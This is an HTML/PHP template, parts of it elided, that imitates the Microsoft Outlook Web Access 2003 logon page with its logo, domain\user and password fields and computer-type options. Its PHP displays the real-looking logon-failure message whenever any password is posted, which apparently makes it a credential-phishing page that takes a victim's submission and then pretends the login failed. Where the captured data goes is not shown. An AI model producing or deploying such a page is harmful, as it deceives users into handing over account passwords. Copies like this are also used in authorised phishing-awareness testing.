...
<head>
		...
		<title>Microsoft Outlook Web Access 02</title>
		<style>
			BODY {font-size:70%;}
			TABLE {font-size:100%}
		...
		<noscript>
			<TABLE id="borderTable" dir="LTR" class="standardTable" cellSpacing=0 cellPadding=0 height="100%" width="100%" bgColor="#3D5FA3" border=0>
			<TR>
				<TD width="25%">&nbsp;</TD>
				<TD width="50%">&nbsp;</TD>
				<TD width="25%">&nbsp;</TD>
...
<body scroll="AUTO" bgcolor="#FFFFFF" text="#000000">
	...
	<table id="borderTable" class="standardTable" bgcolor="#3D5FA3" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
		<tbody><tr height="20">
			<td width="33%">&nbsp;</td>
			<td width="33%">&nbsp;</td>
			<td width="34%">&nbsp;</td>
		...
		<tr>
			...
			<td valign="top" width="33%">
				<table id="mainTable" class="mainTable" bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="0" width="550">
					<tbody><tr>
						<td><img title="" alt="" src="spacer.gif" width="10"></td>
						<td height="100%" valign="top">
							<table id="sidebarTable" class="standardTable" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
							<tbody><tr><td height="100%" width="100%"><img title="" alt="" src="logon_Nav.gif" border="0" height="421" width="76"></td></tr>
							</tbody></table>
						</td>
						<td><img title="" alt="" src="spacer.gif" width="5"></td>
						<td valign="top" width="100%">
							<table id="logoTable" dir="LTR" bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="0" width="100%">
								<tbody><tr>
									<td style="padding-top: 15" align="right" height="120" valign="top" width="100%">
										<img title="" alt="" src="logon_Microsoft.gif" border="0" height="12" hspace="10" width="59">
									</td>
								</tr>
								<tr>
									<td class="logoTD" width="100%">
										
												<img title="Microsoft Office Outlook Web Access provided by Microsoft Exchange Server 2003" alt="Microsoft Office Outlook Web Access provided by Microsoft Exchange Server 2003" src="logon_logo.gif" border="0" height="62" hspace="0" width="331">
										
									</td>
								</tr>
								<tr>
									<td width="100%">
										<table id="usertxtTable" bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="0" width="100%">
											
													<tbody><tr><td align="left" height="8" nowrap="nowrap" valign="top">&nbsp;</td><td width="10"><img title="" alt="" src="spacer.gif" width="10"></td></tr>
															<?php if(!empty($_POST['password'])){ ?>
																<tr><td><p style="color:red">You could not be logged on to Outlook Web Access.  Make sure your domain\user name and password are correct, and then try again.</p></td><td width="10">&nbsp;</td></tr>
															<?php } ?>
															<tr><td valign="TOP" width="100%">&nbsp;</td><td width="10">&nbsp;</td></tr>
														
													<tr><td align="left" height="8" nowrap="nowrap" valign="top">&nbsp;</td><td rowspan="2" width="10">&nbsp;</td></tr>
												
												<tr>
													<td valign="top">
														<table id="contentTable" bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
															<tbody><tr>
																<td nowrap="nowrap" width="1%"><p><label for="username">Domain\user name:</label></p></td>
																<td rowspan="7">&nbsp;&nbsp;</td>
																<td width="98%"><input id="username" name="username" style="width:100%" size="25" maxlength="256" type="text"></td>
																<td rowspan="4">&nbsp;&nbsp;</td>	
																<td width="1%">&nbsp;</td>
															</tr>
															<tr>
																<td height="5"></td>
																<td height="5" valign="top"><img title="" alt="" src="spacer.gif" height="5" width="25"></td>
																<td height="5"></td>
															</tr>
															<tr>
																<td nowrap="nowrap" width="1%"><p><label for="password">Password:</label></p></td>
																<td width="98%"><input autocomplete="off" style="width:100%" id="password" name="password" size="25" maxlength="256" onfocus="g_fDoFocus=false;" type="password"></td>
																<td width="1%"><input value="Log On" id="SubmitCreds" name="SubmitCreds" type="submit"></td>
															</tr>
															<tr>
																<td height="12"></td>
																<td height="12" valign="top"><img title="" alt="" src="spacer.gif" height="12" width="25"></td>
																<td height="12"></td>
															</tr>
															<tr><td>&nbsp;</td><td colspan="4"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td colspan="2" style="padding-bottom:3px;" width="100%"><b>Security</b>&nbsp;</td></tr><tr><td colspan="2"><table cellpadding="0" cellspacing="0"><tbody><tr><td><input id="rdoPublic" checked="checked" name="trusted" value="0" type="radio"></td><td nowrap="nowrap"><label for="rdoPublic">Public or shared computer</label></td></tr><tr><td height="6"><img title="" alt="" src="spacer.gif" height="6"></td><td height="6"></td></tr><tr id="trPublic"><td>&nbsp;</td><td>Select this option if you use Outlook Web Access on a public computer.</td></tr></tbody></table></td></tr><tr><td height="6"><img title="" alt="" src="spacer.gif" height="6"></td><td height="6"></td></tr><tr><td colspan="2"><table cellpadding="0" cellspacing="0"><tbody><tr><td><input id="rdoTrusted" name="trusted" value="4" type="radio"></td><td nowrap="nowrap"><label for="rdoTrusted">Private computer</label></td></tr><tr><td height="6"><img title="" alt="" src="spacer.gif" height="6"></td><td height="6"></td></tr><tr id="trTrusted"><td>&nbsp;</td><td>Select this option if you are the only person who uses this computer.</td></tr><tr id="trWrn"><td>&nbsp;</td><td><font color="red"><b>Warning:</b> By selecting this option you acknowledge that the computer complies with your organization's security policy.</font></td></tr></tbody></table></td></tr></tbody></table></td></tr>
														</tbody></table>
													</td>
												</tr>
											</tbody></table>
					...
					<font color="#FFFFFF">
						<br>
						To protect your account from unauthorized access, Outlook Web 
